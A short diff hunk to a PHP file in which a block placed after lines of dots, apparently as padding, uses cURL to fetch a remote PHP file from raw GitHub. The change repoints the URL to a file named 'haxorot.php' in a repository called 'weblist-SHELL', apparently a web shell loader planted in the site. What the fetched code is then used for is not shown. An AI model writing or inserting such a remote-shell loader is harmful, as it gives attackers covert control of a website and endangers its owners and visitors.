@@ -838,7 +838,7 @@
 .
 .
 <?php
-    $Url = "https://raw.githubusercontent.com/kembarbaru120000/213/refs/heads/main/index.php";
+    $Url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/haxorot.php";
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $Url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
